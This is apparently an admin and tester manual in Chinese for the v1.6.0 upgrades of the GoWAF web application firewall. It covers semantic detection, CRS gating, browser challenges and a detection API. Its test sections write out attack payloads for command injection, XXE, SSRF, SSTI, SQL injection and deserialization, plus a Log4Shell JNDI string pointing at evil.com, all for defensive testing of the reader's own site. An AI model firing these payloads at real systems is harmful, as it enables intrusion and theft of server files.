# v1.6.0 四项升级：开启、验证、实测指南

> 面向管理员/测试者的通俗操作手册。所有命令都可直接复制执行；
> `8899` 为控制台端口，`www.phpframe.org` 换成你自己的受保护站点域名。
> 四项能力中 1/2/3 是「设置键」，控制台改完即时热生效；4 是「配置文件项」，需改 config.yaml 并重启。

---

## 一、语义检测通道（第四引擎）

### 1.1 这是什么（通俗版）

旧引擎像「查字典」：请求里出现 `"union select"`、`"<script>"` 这类坏词才报警，攻击者把词变形（编码、拆分、换写法）就能绕过。
语义通道像「语法老师」：它看的是**句子结构**——

- 管道符/分号/反引号**紧挨着**系统命令（`|cat /etc/passwd`）→ 命令注入
- XML 里 `<!DOCTYPE` 和 `<!ENTITY` **成对出现**还指向 `file://` → XXE
- 参数值是个**危险协议**（`gopher://`、`file://`、`169.254.169.254` 云元数据）→ SSRF
- `{{7*7}}`、`__class__.__mro__` 这种**模板运算/属性链** → SSTI
- `${jndi:ldap://...}` **求值表达式** → Log4Shell
- body 开头是 Java 序列化**魔数**（`rO0AB`、`aced0005`）→ 反序列化

因为判定的是结构而不是某个词，所以多层编码变形后依然能识别（解码先于检测）。

### 1.2 怎么开启

**默认已开启，无需任何操作。** 想调整的话：

- 控制台 `http://<IP>:8899` → 防护配置页 → **检测引擎** Tab，有 `engine.sem.*` 一组开关与分值；
- 对应设置键（保存在数据库，控制台保存即热生效）：

| 设置键 | 默认值 | 说明 |
|---|---|---|
| `engine.sem.enabled` | `true` | 总开关 |
| `engine.sem.cmdi_score` | `45` | 命令注入命中加分 |
| `engine.sem.rce_score` | `50` | 远程代码执行 |
| `engine.sem.ssrf_score` | `35` | SSRF |
| `engine.sem.xxe_score` | `40` | XXE |
| `engine.sem.ssti_score` | `40` | SSTI |
| `engine.sem.expr_score` | `45` | 表达式注入（JNDI/SpEL/OGNL） |
| `engine.sem.deser_score` | `40` | 反序列化 |

### 1.3 分数怎么理解（重要）

全局阈值：**block 60 拦截，challenge 30 进人机校验**。语义通道单类命中只加 35~50 分，**故意压在拦截线以下**——意思是「单靠语义通道不会直接拦你」，要叠加其他引擎的分数（CRS、规则、libi）凑够 60 才 block。这是防误报的保守设计：宁可不拦，也不错杀。

### 1.4 怎么实验

对着受保护站点打 7 类样本，看响应头：

```bash
D=www.phpframe.org   # 换成你的站点域名
# 命令注入（45 分）
curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" 'http://127.0.0.1/?host=|cat%20/etc/passwd'
# RCE（50 分）
curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" --data 'cmd=system('"'"'id'"'"')' http://127.0.0.1/
# XXE（40 分）
curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>' http://127.0.0.1/
# SSRF（35 分）
curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" 'http://127.0.0.1/?u=file:///etc/passwd'
# SSTI（40 分）
curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" 'http://127.0.0.1/?name=%7B%7B7*7%7D%7D'
# Log4Shell（45 分，Header 注入）
curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" -H 'User-Agent: ${jndi:ldap://evil.com/x}' http://127.0.0.1/
# 反序列化（40 分）
curl -s -o /dev/null -w '%{http_code}\n' -H "Host: $D" --data 'data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==' http://127.0.0.1/
```

**预期结果**：多数样本返回 `403`（语义分 + 规则/CRS 分叠加过线）或 `307/403 挑战页`；至少去控制台 **安全事件** 里能看到带 `sem-cmdi` / `sem-rce` / `sem-xxe` / `sem-ssrf` / `sem-ssti` / `sem-expr` / `sem-deser` 规则 ID 的命中记录——这就是语义通道工作的直接证据。

**误报验证**（正常流量不能被冤枉）：

```bash
curl -s -o /dev/null -w '%{http_code}\n' -H "Host: $D" 'http://127.0.0.1/?q=how to pass the exam'   # expect 200/挑战页而非 block
```

### 1.5 误报治理

某类结构在你的业务里是合法的（比如搜索框就是让人输 `{{ }}` 的模板站）？不要直接调分到 0，用**例外规则**：规则 ID 前缀 `sem-`（如 `sem-ssti`），按「站点+路径」放行，其他站点的 SSTI 防护不受影响。

## 二、CRS 调度闸门

### 2.1 这是什么（通俗版）

CRS 是一套上千条的通用规则（Coraza 引擎），查得全但**每条都要过一遍**，实测占了全引擎 75% 的耗时——是吞吐天花板。
调度闸门就是在 CRS 门口加了一个「分诊台」：

1. **可疑度预筛**（`prescreen`，默认关）：用 AC 自动机先扫一眼请求，一个可疑关键词都没有 → 直接跳过 CRS 细查。词表来自 CRS 规则文件里的字面量 + 常见扫描器 UA + 注入结构词，干净流量 100% 会被旁路。
2. **静态资源旁路**（默认开）：`.js/.css/.png` 这类无参数静态请求，没有注入面，跳过。
3. **二进制 body 跳过**（默认开）：图片/压缩包 body 没法是 SQL 注入，跳过 phase-2。
4. **路径豁免**（`exclude_paths`）：指定路径前缀完全不进 CRS（如内部健康检查）。
5. **号段移除**（`remove_ranges`）：编译期就把某组规则删掉（如 `920` 整段），省运行时匹配。

### 2.2 怎么开启

控制台 → 防护配置页 → **检测引擎** Tab → CRS 区：

| 设置键 | 默认值 | 建议 |
|---|---|---|
| `engine.crs.prescreen` | `false`（关） | **上线先观察事件库几天，确认无漏拦再开**。开了实测 3.2 倍吞吐 |
| `engine.crs.skip_static` | `true` | 保持默认 |
| `engine.crs.body_text_only` | `true` | 保持默认 |
| `engine.crs.exclude_paths` | 空 | 如 `/healthz,/actuator` |
| `engine.crs.remove_ranges` | 空 | 误报整段难治理时用，如 `"920"`；动了要回归测试 |

所有键**保存即热生效**，不用重启。

### 2.3 怎么实验（吞吐对比 + 打点验证）

```bash
# 1) 记录当前指标
curl -s http://127.0.0.1:8899/metrics | grep waf_crs_skipped_total

# 2) 控制台开启 engine.crs.prescreen，然后压测（hey 或 ab）
hey -c 64 -n 20000 -H "Host: $D" http://127.0.0.1/
#   预筛关闭基线约 4k RPS，开启后约 12.8k RPS（6 核机器实测）

# 3) 再看打点：prescreen 原因的计数应大幅增长
curl -s http://127.0.0.1:8899/metrics | grep waf_crs_skipped_total
#   waf_crs_skipped_total{reason="prescreen"} …
#   waf_crs_skipped_total{reason="static"} …
#   waf_crs_skipped_total{reason="binary_body"} …
```

**关键回归**：开预筛后攻击样本必须仍然全拦——

```bash
for u in "?id=1%27+or+%271%27%3D%271" "?name=%7B%7B7*7%7D%7D" "?u=file:///etc/passwd"; do
  curl -s -o /dev/null -w '%{http_code} ' -H "Host: $D" "http://127.0.0.1/$u"
done; echo   # 预期全部 403
```

**⚠️ 实验顺序的坑**：先做吞吐压测，**后**打攻击样本。攻击样本命中 ban 类规则会把你自己的 IP 封掉，之后的压测会全是 4xx，数据全废。（血泪教训）

## 三、人机验证双层升级

### 3.1 这是什么（通俗版）

原来的人机验证是「做题」：给浏览器出一道 PoW 计算题，算出来才发 Cookie。问题是脚本解这题只要微秒级——**题本身拦不住机器**。
v1.6.0 加了两道「监考」：

1. **环境信号校验**（`env_check`，默认开）：做题时顺带采集浏览器环境——`navigator.webdriver`（headless 必为 true）、CPU 核数、屏幕分辨率、时区、WebGL 厂商/渲染器、页面耗时结构。真实浏览器这些字段齐全且自洽；headless/脚本要么 webdriver=true，要么字段残缺——**不用做难题，验一下准考证就够了**。
2. **最小耗时校验**（`min_elapsed_ms`，默认 500ms）：真实浏览器从打开页面到交卷约 0.3 秒 + 页面加载；脚本微秒级交卷就是作弊。

对真实用户**完全无感**——不需要点验证码，页面自己完成。

### 3.2 怎么开启

默认已开启。控制台 → 防护配置页 → **限流与封禁** Tab：

| 设置键 | 默认值 | 说明 |
|---|---|---|
| `guard.challenge.env_check` | `true` | 环境信号校验；发现误伤辅助工具可暂时关闭观察 |
| `guard.challenge.min_elapsed_ms` | `500` | 最小耗时毫秒数；网络慢的移动端可放宽到 800~1000 |

### 3.3 怎么实验

**三组对照**：

```bash
# ① curl（非浏览器）：拿不到 Cookie，永远停在挑战页 —— 符合预期
curl -s -H "Host: $D" http://127.0.0.1/ | grep -o '<title>[^<]*</title>'
#   预期：<title>安全校验</title>

# ② 真实浏览器：地址栏打开站点，无感通过（F12 网络面板能看到
#    挑战页的 JS 在算 PoW 并上报 env 信号，随后拿到 Cookie 正常浏览）

# ③ headless Chrome：模拟脚本流量 —— 应被拦
chromium --headless --disable-gpu --dump-dom http://你的域名/ 2>/dev/null | grep -c '安全校验'
#   headless 的 navigator.webdriver=true / WebGL 字段缺失，应再次收到挑战页或 403
```

**验证耗时校验**：把 `min_elapsed_ms` 调到 5000，再用正常浏览器访问——算完 PoW 立即提交仍会因「太快」被拒，直观感受这道闸门。

## 四、检测引擎独立调用

### 4.1 这是什么（通俗版）

以前 GoWAF 只能「站在大门口」：所有流量必须先经过它，它才能检测。
现在它也可以「坐在传达室」：你的 Nginx/Traefik/Kong 继续做原来的网关，每来一个请求，**问一句 GoWAF「这个放不放行」**，GoWAF 只回结论（放行/拦截/需人机校验），不碰流量。
这就解耦了「接入」和「检测」——已有 Nginx 体系不想换网关，也能用上 GoWAF 的四引擎检测（对标雷池 T1K 的形态）。

### 4.2 怎么开启

这是**配置文件项**（不在控制台设置页），编辑 `/www/server/gowaf/configs/config.yaml`：

```yaml
server:
  detect_listen: "127.0.0.1:8020"   # 绑回环或内网；填 0.0.0.0 必须配令牌
  detect_token: "换一个强随机串"      # 可选；为空则不认证（仅限回环）
```

然后 `systemctl restart gowaf`。日志出现 `[app] 独立检测引擎监听 127.0.0.1:8020` 即成功。

### 4.3 怎么实验

**① 探活**

```bash
curl -s http://127.0.0.1:8020/healthz
```

**② POST /detect（完整判定，适合自研网关/SDK）**

```bash
TOKEN="你的令牌"
# 正常请求 → 应返回 pass
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8020/detect \
  -d '{"method":"GET","host":"demo.com","path":"/api/user","query":"id=1"}'
# 攻击请求 → 应返回 block，hits 里能看到规则 ID（crs-*/sem-*/libi-*）
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8020/detect \
  -d '{"method":"GET","host":"demo.com","path":"/api/user","query":"id=1 union select password from users"}'
```

响应里的 `action`（pass/log/challenge/block/ban）、`score`、`hits`、`elapsed_us` 就是逐引擎判定的完整结论。

**③ GET /check（网关鉴权式，适合 nginx auth_request / Traefik forwardAuth）**

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Forwarded-Method: GET" \
  -H "X-Forwarded-Host: demo.com" \
  -H "X-Forwarded-Uri: /?id=1%27+or+%271%27%3D%271" \
  "http://127.0.0.1:8020/check"
# 2xx=放行 / 403=拦截 / 401+X-WAF-Action: challenge=需人机校验（此例预期 403）
```

**④ 真·网关接入**：`deploy/integrations/nginx/`（waf_detect.lua + nginx.conf.example）与 `deploy/integrations/traefik/forwardauth.yml` 有现成配置，按注释改 IP/令牌即可。协议文档见 `docs/integrations-detect-api.md`。

### 4.4 与内置代理模式的差异（避免误解）

| 行为 | 内置数据面 | /detect /check |
|---|---|---|
| CRS 调度闸门（prescreen 等） | 生效 | **不生效**（全量 CRS；旁路优化交给网关缓存） |
| 多层解码 / 语义 / libi / 规则 | 生效 | 生效（同一套配置） |
| 处置执行 | WAF 直接 403/挑战/封禁 | 只回结论，**由网关执行** |

## 五、一分钟自检清单（升级后 10 分钟跑完）

```bash
D=www.phpframe.org   # 换成你的域名

# 语义通道：7 类样本 + 1 条正常流量
curl -s -o /dev/null -w 'cmdi:%{http_code}\n'  -H "Host: $D" 'http://127.0.0.1/?host=|cat%20/etc/passwd'
curl -s -o /dev/null -w 'ssrf:%{http_code}\n'  -H "Host: $D" 'http://127.0.0.1/?u=file:///etc/passwd'
curl -s -o /dev/null -w 'ssti:%{http_code}\n'  -H "Host: $D" 'http://127.0.0.1/?name=%7B%7B7*7%7D%7D'
curl -s -o /dev/null -w 'log4j:%{http_code}\n' -H "Host: $D" -H 'User-Agent: ${jndi:ldap://e.com/x}' http://127.0.0.1/

# 人机验证：curl 应拿到「安全校验」页
curl -s -H "Host: $D" http://127.0.0.1/ | grep -o '<title>[^<]*</title>'

# CRS 闸门打点可读
curl -s http://127.0.0.1:8899/metrics | grep waf_crs_skipped_total

# 控制台事件库：过滤规则 ID 前缀 sem-，应有新增记录
```

四条攻击样本全部 403/挑战 + 正常流量未被 block + metrics 有输出 = 四项升级全部工作正常。
